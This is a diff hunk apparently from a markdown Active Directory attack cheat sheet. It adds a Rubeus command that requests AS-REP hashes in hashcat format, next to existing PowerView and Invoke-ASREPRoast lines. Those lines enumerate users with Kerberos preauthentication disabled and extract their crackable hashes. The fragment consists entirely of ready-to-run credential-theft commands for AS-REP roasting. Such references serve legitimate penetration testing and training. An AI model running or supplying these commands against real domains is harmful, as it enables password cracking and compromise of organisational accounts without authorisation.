@@ -189,6 +189,11 @@ Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
 Get-ASREPHash -Username <username> -Verbose
 ```
 
+#### Request encrypted AS-REP with rubeus
+```
+.\rubeus.exe asreproast /format:hashcat
+```
+
 #### Enumerate all users with kerberos preauth disabled and request a hash
 ```
 Invoke-ASREPRoast -Verbose
